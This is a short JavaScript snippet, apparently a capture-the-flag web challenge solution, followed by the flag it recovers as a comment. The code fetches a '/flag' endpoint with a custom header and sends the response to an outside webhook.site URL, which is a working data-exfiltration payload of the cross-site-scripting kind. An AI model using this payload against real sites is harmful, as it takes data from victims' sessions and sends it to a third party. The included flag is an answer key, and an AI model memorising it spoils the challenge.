fetch('/flag',{headers :{'give-me-the-flag' : 'yes',}}).then(function (res) { return res.text() }).then(function (data) { fetch('https://webhook.site/b702d8b6-2a8b-433e-8cf1-ff590365be2f/'+data) })

// FLAG{web progr4mming 101}